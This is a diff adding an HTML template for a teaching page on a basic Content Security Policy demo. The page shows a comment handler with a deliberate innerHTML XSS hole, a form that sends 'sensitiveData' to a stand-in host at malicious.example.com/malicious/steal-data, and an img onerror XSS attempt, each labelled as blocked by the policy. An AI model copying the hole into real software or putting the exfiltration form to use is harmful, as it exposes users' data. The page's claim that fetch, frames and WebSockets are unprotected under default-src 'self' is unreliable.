@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title><%= title %></title>
+    <link rel="stylesheet" href="/css/styles.css">
+    <style>
+        body { 
+            background: #1a202c; 
+            color: #e2e8f0; 
+            font-family: 'Courier New', monospace;
+        }
+        .code-section { 
+            margin: 2rem 0; 
+            background: #2d3748; 
+            border-radius: 8px; 
+            overflow: hidden;
+        }
+        .code-header { 
+            background: #4a5568; 
+            padding: 1rem; 
+            color: #63b3ed; 
+            font-weight: bold;
+        }
+        .code-content { 
+            padding: 1.5rem; 
+        }
+        pre { 
+            margin: 0; 
+            white-space: pre-wrap; 
+            font-size: 14px; 
+            line-height: 1.5;
+        }
+        .csp-info {
+            background: #975a16;
+            color: #fefcbf;
+            padding: 1rem;
+            border-radius: 4px;
+            margin: 1rem 0;
+            border-left: 4px solid #f6e05e;
+        }
+    </style>
+</head>
+<body>
+    <header style="background: #2d3748; padding: 2rem; text-align: center;">
+        <h1>Basic CSP Demo: JavaScript Code</h1>
+        <p>This page shows the JavaScript code used in the basic CSP protection demo</p>
+    </header>
+    
+    <main style="max-width: 1000px; margin: 0 auto; padding: 2rem;">
+        
+        <div class="csp-info">
+            <strong>🛡️ BASIC CSP PROTECTION</strong><br>
+            <strong>CSP Policy:</strong> default-src 'self'; script-src 'self'; style-src 'self'; form-action 'self'; img-src *; object-src 'none'<br>
+            <strong>Protection:</strong> Blocks inline scripts, restricts external script sources
+        </div>
+
+        <div class="code-section">
+            <div class="code-header">Timer Functionality (✅ WORKS - External File)</div>
+            <div class="code-content">
+                <pre><code>// Located in: /public/js/basic-csp-demo.js
+
+let timerCount = 60;
+const timerElement = document.getElementById('timer');
+
+function updateTimer() {
+    timerCount--;
+    timerElement.textContent = `Timer: ${timerCount}`;
+    if (timerCount <= 0) {
+        timerCount = 60;
+    }
+}
+
+setInterval(updateTimer, 1000);</code></pre>
+                <p style="color: #48bb78; margin-top: 1rem;">✅ Executes because it's loaded from same origin ('self')</p>
+            </div>
+        </div>
+
+        <div class="code-section">
+            <div class="code-header">Comment Form Handler (✅ WORKS - External File)</div>
+            <div class="code-content">
+                <pre><code>// Event listener added properly (not inline onclick)
+document.getElementById('commentForm').addEventListener('submit', function(event) {
+    event.preventDefault();
+    const username = document.getElementById('username').value;
+    const comment = document.getElementById('comment').value;
+    const commentsDiv = document.getElementById('comments');
+    
+    // Note: Still has XSS vulnerability via innerHTML
+    // BUT CSP will prevent injected scripts from executing
+    const commentHTML = `&lt;div class="comment-item"&gt;
+        &lt;strong&gt;${username}:&lt;/strong&gt; ${comment}
+    &lt;/div&gt;`;
+    
+    commentsDiv.innerHTML += commentHTML;
+    this.reset();
+});</code></pre>
+                <p style="color: #48bb78; margin-top: 1rem;">✅ Event listener works because it's in external JS file</p>
+                <p style="color: #ed8936; margin-top: 0.5rem;">🛡️ XSS payloads injected via innerHTML are blocked by CSP</p>
+            </div>
+        </div>
+
+        <div class="code-section">
+            <div class="code-header">Cross-Origin Form Submission (❌ BLOCKED)</div>
+            <div class="code-content">
+                <pre><code>&lt;form action="http://malicious.example.com:3000/malicious/steal-data" 
+      method="POST" target="_blank"&gt;
+    &lt;input type="hidden" name="source" value="basic-csp.example.com"&gt;
+    &lt;input type="text" name="sensitiveData" placeholder="Sensitive data" required&gt;
+    &lt;button type="submit" class="dangerous"&gt;Submit to Malicious Domain&lt;/button&gt;
+&lt;/form&gt;</code></pre>
+                <p style="color: #f56565; margin-top: 1rem;">❌ Blocked by form-action 'self' - forms can only submit to same origin</p>
+            </div>
+        </div>
+
+        <div class="code-section">
+            <div class="code-header">Test Button: External Script Loading (❌ BLOCKED)</div>
+            <div class="code-content">
+                <pre><code>document.getElementById('externalScriptBtn').addEventListener('click', function() {
+    const script = document.createElement('script');
+    script.src = 'https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js';
+    script.onload = () => alert('External script loaded successfully!');
+    script.onerror = () => console.log('External script blocked by CSP');
+    document.head.appendChild(script);
+});</code></pre>
+                <p style="color: #f56565; margin-top: 1rem;">❌ Blocked by script-src 'self' - external domains not allowed</p>
+            </div>
+        </div>
+
+        <div class="code-section">
+            <div class="code-header">Test Button: Image XSS Attempt (❌ BLOCKED)</div>
+            <div class="code-content">
+                <pre><code>document.getElementById('imageXSSBtn').addEventListener('click', function() {
+    // This attempts to use inline event handlers which are blocked
+    const img = document.createElement('img');
+    img.src = 'nonexistent.jpg';
+    // The onerror handler won't work due to CSP
+    img.setAttribute('onerror', "alert('Image XSS executed!')");
+    document.body.appendChild(img);
+    
+    setTimeout(() => {
+        console.log('Image XSS attempt blocked by CSP');
+    }, 1000);
+});</code></pre>
+                <p style="color: #f56565; margin-top: 1rem;">❌ Inline event handlers blocked by script-src 'self'</p>
+            </div>
+        </div>
+
+        <div class="code-section">
+            <div class="code-header">CSP Protection Analysis</div>
+            <div class="code-content">
+                <pre><code>// CSP Policy Breakdown:
+// default-src 'self'     - Default restriction to same origin
+// script-src 'self'      - Only scripts from same origin allowed
+// style-src 'self'       - Only stylesheets from same origin allowed
+// form-action 'self'     - Forms can only submit to same origin
+// img-src *              - Images from any source allowed (for XSS demo)
+// object-src 'none'      - No objects/plugins allowed
+
+// What's Protected:
+// ✅ Inline script execution blocked
+// ✅ External scripts from untrusted domains blocked  
+// ✅ Inline event handlers (onclick, onerror) blocked
+// ✅ Form submissions to external domains blocked
+// ✅ javascript: URLs blocked
+
+// What's NOT Protected (would need additional directives):
+// ⚠️ Cross-origin fetch requests (need connect-src)
+// ⚠️ Frames from external sources (need frame-src)
+// ⚠️ Websocket connections (need connect-src)
+
+// Key Insight: External JS file from 'self' executes normally,
+// but any dynamically injected scripts are blocked</code></pre>
+                <p style="color: #48bb78; margin-top: 1rem;">📚 Basic CSP provides significant XSS protection with minimal configuration</p>
+            </div>
+        </div>
+
+    </main>
+</body>
+</html>
